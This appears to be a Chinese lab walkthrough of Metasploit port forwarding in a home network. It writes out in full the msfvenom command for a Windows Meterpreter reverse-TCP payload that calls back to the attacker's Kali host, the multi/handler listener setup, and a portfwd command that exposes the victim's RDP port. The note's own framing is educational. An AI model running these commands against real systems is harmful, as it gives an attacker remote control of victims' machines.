ailx10说：这篇是2022年7月之前写的，后来又改过。这次有了 Meterpreter 会话以后，我用 portfwd 把目标自己的远程桌面接到控制端端口，再从外面的 Mac 访问过去。127.0.0.1 看着都一样，实际上得站在目标会话的位置理解，才能知道后面接的是哪台机器。笔记把 handler、会话、映射和远程桌面的关系留在一起，给后面再用时一个对照。它没有另外解决 RDP 的账号问题，也不是直接等同 SSH 的远程转发；先问端口实际开在哪里，比用“远程”两个字概括整段过程更不容易绕晕。

---

实验环境：

- macos：192.168.199.206
- kali：192.168.199.247
- win7：192.168.199.185

1、生成一个小马

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.199.247 -f exe > hack.exe
```

![](/notes-assets/01c003a5c585adc7e166.jpg)

2、通过metasploit监听5555端口

```
use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lhost 0.0.0.0

set lport 5555
```

![](/notes-assets/ab8744baa6d426b2de40.jpg)

3、找个windows虚拟机，运行小马

```
exploit -j -z

sessions
```

![](/notes-assets/86f452b3fbb5b95e1adc.jpg)

4、进入sessions，然后使用portfwd进行端口转发

```
portfwd add -l 1111  -r 127.0.0.1 -p 3389
```

![](/notes-assets/a7673adcab87cb6b6db4.jpg)

5、访问kali的1111端口，就是访问win7的3389端口

![](/notes-assets/c9a764e0887226464df3.jpg)

网络安全任重道远，洗洗睡吧～

同一个地址字符串，放在不同执行上下文里就会改变含义。把监听位置说清楚，再检查其他机器是否真能访问，后面的远程桌面结果才有来路。
